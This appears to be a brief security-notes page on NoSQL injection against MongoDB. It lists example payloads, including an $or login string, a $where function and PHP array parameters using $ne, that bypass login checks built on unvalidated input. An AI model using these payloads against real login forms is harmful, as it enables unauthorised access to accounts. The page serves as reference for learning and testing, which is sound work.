---
layout: page
title:  "NoSQL injections"
permalink: "nosql-injections.html"
tags: [security, injections, web]
summary: ""
---

## NoSQL OR injections
* `login=admin',$or:[{},{'a'='a&pass='}]`
* `find( {'$where' : 'function() { return artist == "Weezer"; }'} )`

## PHP array injections
* PHP associative arrays: `$collection->find(array('login' => 'test'))` equivalent to `find({'login': 'test'})`
* Automatic array creation: if `page.php?param[foo]=bar` then `param == array('foo' => 'bar')`
* If `db->logins->find(array(“username”=>$_POST[“username”],
“password”=>$_POST[“password”]));`, then `login[$ne]=test&password[$ne]=test` transformed to `array(“username” => array(“$ne” => 1), “password” =>
array(“$ne” => 1));` equivalent to `{ username: { $ne: 1 }, password: { $ne: 1 } }`


## Resources and references
* [NoSQL cheatsheet](/programming/nosql)
